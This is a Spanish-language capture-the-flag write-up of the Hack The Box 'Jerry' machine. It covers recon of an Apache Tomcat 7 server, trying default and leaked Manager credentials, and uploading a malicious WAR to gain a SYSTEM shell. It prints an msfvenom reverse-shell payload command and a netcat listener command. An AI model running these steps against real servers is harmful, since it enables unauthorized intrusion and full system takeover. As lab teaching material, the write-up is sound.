--- 
title: Jerry
os: Windows
dificultad: Facil
img: jerry/jerry_logo.png 
skills:
  - Web Enumeration
  - Enumerating Tomcat
  - Information Leakage
  - Abusing Tomcat WAR uploads (Privilege Escalation)
plataforma: Hackthebox 
description: Jerry es una máquina Windows de dificultad fácil que muestra cómo explotar Apache Tomcat, lo que conduce a un revert shell como el usuario NT Authority\SYSTEM, comprometiendo así por completo el objetivo.
--- 

### Descripción

Jerry es una máquina Windows catalogada con un nivel de dificultad fácil en la plataforma Hack The Box. Su principal enfoque es demostrar la explotación de Apache Tomcat, un servidor de aplicaciones ampliamente utilizado en entornos empresariales.

El reto comienza con un reconocimiento inicial que permite identificar el servicio Tomcat en ejecución y acceder a su panel de administración. A partir de ahí, se explora la posibilidad de autenticarse o abusar de configuraciones por defecto para desplegar un archivo malicioso (WAR). Este procedimiento conduce a la obtención de un reverse shell dentro del sistema.

Una vez establecido el acceso, se observa que el proceso comprometido se está ejecutando con privilegios elevados, específicamente como NT Authority\SYSTEM, la cuenta con mayor nivel de permisos en sistemas Windows. Esto implica un control total del objetivo

### Objetivos

#### Objetivo general

Comprender y aplicar técnicas de explotación en un entorno Windows vulnerable, utilizando debilidades en la configuración de Apache Tomcat, con el fin de obtener acceso privilegiado y comprometer completamente el sistema.

#### Objetivos Especificos

- Realizar un proceso de reconocimiento para identificar servicios expuestos y tecnologías en uso.
- Detectar la presencia del servidor Apache Tomcat y analizar posibles credenciales o configuraciones por defecto.
- Explorar la carga de archivos maliciosos (WAR) como vector de ataque para obtener un reverse shell.
- Validar el nivel de privilegios obtenidos y comprobar la ejecución bajo la cuenta NT Authority\SYSTEM. 


### Analisis de Vulnerabilidades

#### Reconocimiento Inicial

Se comenzó realizando un análisis inicial sobre el sistema, cuyo objetivo principal fue comprobar la disponibilidad y accesibilidad del equipo o servicio objetivo desde el segmento de red en el que se estaba operando. Esta verificación resultó fundamental para asegurar que la comunicación entre el host atacante y el sistema de destino fuera posible antes de iniciar fases más avanzadas de la evaluación. Para llevar a cabo esta tarea de reconocimiento preliminar, se emplearon herramientas de terminal ampliamente utilizadas en auditorı́as de seguridad:

**Ping**, para enviar solicitudes ICMP al host y confirmar su capacidad de respuesta, además de obtener información básica como ser el tipo de sistema operativo ya sea Windows o Linux mediante el **TTL**.

![Ejecución del comando ping](/jerry/ping.png)

**Nmap**, para efectuar un escaneo de puertos y servicios disponibles, identificando posibles puntos de entrada o servicios expuestos que pudieran ser analizados en etapas posteriores.

![Ejecución del comando ping](/jerry/nmap.png)

Este proceso inicial permitió obtener una visión general del estado de la red y del sistema objetivo, sirviendo como base para definir la estrategia y priorizar las acciones en las siguientes fases de la evaluación.

### Analisis de Vulnerabilidades

#### Reconocimiento Inicial

Seguidamente, una vez identificados los servicios activos en el sistema objetivo, se detecta la presencia del puerto 8080/TCP abierto. Dicho puerto corresponde a un servicio web gestionado por Apache Tomcat, un contenedor de servlets ampliamente utilizado en entornos corporativos para desplegar aplicaciones Java.

#### Puerto 8080 (Servicio Web)

Al ejecutar el comando **whatweb** desde la terminal, se obtiene información detallada acerca de las tecnologı́as y frameworks que utiliza el servicio web en el puerto correspondiente. El resultado de este análisis revela que el servicio está siendo ejecutando **Apache Tomcat** en su versión **7.0.88**

Apache Tomcat es un servidor de aplicaciones web de código abierto desarrollado por la Apache Software Foundation (ASF).
Su principal función es ejecutar aplicaciones web creadas en Java, ya que implementa de manera nativa las especificaciones de:

- Java Servlet
- JavaServer Pages (JSP)
- WebSocket
- Java Expression Language (EL)

En otras palabras, Tomcat actúa como un contenedor de servlets, permitiendo que las aplicaciones web escritas en Java puedan ejecutarse en un servidor.

Al acceder al servicio web vemos la pagina por defecto de Apache Tomcat:

[![Apache Tomcat](/jerry/tomcat01.png)](/jerry/tomcat01.png)

Al realizar una búsqueda de directorios utilizando la herramienta **Gobuster**, se logró identificar la existencia del directorio **/manager/** dentro del servicio web expuesto en el puerto 8080. Este hallazgo resulta especialmente relevante, ya que dicho directorio corresponde al **Tomcat Web Application Manager**, una interfaz de administración incluida en Apache Tomcat.

[![busqueda gobuster](/jerry/gobuster.png)](/jerry/gobuster.png)

Al navegar a la aplicación Manager, se muestra un inicio de sesión:

[![manager tomcat](/jerry/tomcatmanager.png)](/jerry/tomcatmaneger.png)

Al no disponer de credenciales válidas para acceder al panel de Manager de Apache Tomcat, se procedio a realizar una búsqueda en Internet enfocada en credenciales por defecto comúnmente configuradas en este tipo de entornos dando como resultado las siguientes credenciales:>

- tomcat:tomcat
- admin:admin
- manager:manager

Al realizar múltiples intentos de acceso al panel **Manager** utilizando credenciales no válidas, el servidor responde con una página de error **403 Access Denied**, indicando que el usuario no tiene permisos para acceder al recurso solicitado.

Curiosamente, en este escenario particular, la página de error no solo bloquea el acceso, sino que también **filtra información sensible**, mostrando indirectamente las credenciales válidas necesarias para autenticarse correctamente. Este tipo de comportamiento constituye una **fuga de información (information Leakage)**, ya que proporciona a un atacante datos que normalmente deberían permanecer confidenciales.

[![information leakage](/jerry/tomcaterror.png)](/jerry/tomcaterror.png)

Al ingresar las **credenciales válidas** obtenidas previamente, se logra acceder al **panel de control** del aplicativo Manager de Apache Tomcat. Esta interfaz proporciona un **entorno administrativo completo**, permitiendo al usuario autorizado gestionar todas las aplicaciones web desplegadas en el servidor.

[![panel de tomcat](/jerry/tomcatpanel.png)](/jerry/tomcatpanel.png)

Seguidamente, una vez autenticados en el panel Manager de Apache Tomcat, procedimos a realizar una búsqueda de vulnerabilidades asociadas al servidor y a su versión específica. Esta fase de investigación permite identificar posibles vectores de ataque que podrían aprovecharse para comprometer el sistema de manera más profunda.

Durante el análisis, se evaluaron aspectos como configuraciones inseguras, servicios adicionales expuestos, y la posibilidad de ejecutar código de manera remota. La investigación arrojó como resultado un método de intrusión efectivo: `la subida de un archivo WAR malicioso`.

Los archivos WAR (Web Application Archive) son paquetes que contienen aplicaciones Java completas listas para desplegar en un servidor Tomcat. Si se logra subir un WAR malicioso al panel Manager, este se ejecuta bajo los privilegios del proceso de Tomcat, permitiendo al atacante ejecutar comandos en el sistema operativo, obtener un shell remoto y, dependiendo de la configuración del servidor, incluso escalar privilegios.

[![subir archivo war](/jerry/war01.png)](/jerry/war01.png)

A continuación creamos nuestro war malicioso mediante msfvenom:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.x.x LPORT=443 -f war -o shell.war
```
Corroboramos que el archivo war fue subido exitosamente:

[![comprobacion del shell](/jerry/shell.png)](/jerry/shell.png)

y nos ponemos en escucha utilizando **netcat** en el puerto especificado en el arvhivo war, al ser windows tambien utilizamos en comando **rlwrap** para tener una shell semi-interactiva:

```bash
rlwrap nc -lnvp 443
```

Al darle clip a shell en el panel de control se ejecuta el archivo war y nos da una shell inversa:

[![revert shell](/jerry/terminal01.png)](/jerry/terminal01.png)

Luego mediante el comando **whoami** comprobamos que somos el usuario **nt authority\system**:

[![comprobación de usuario](/jerry/terminal02.png)](/jerry/terminal02.png)

Por ultimo nos dirigimos al directorio `C:\Users\Administrator\Desktop\flags` y litamos el archivo `2 for the price of 1.txt` en el cual se encuentran las flags y user y root.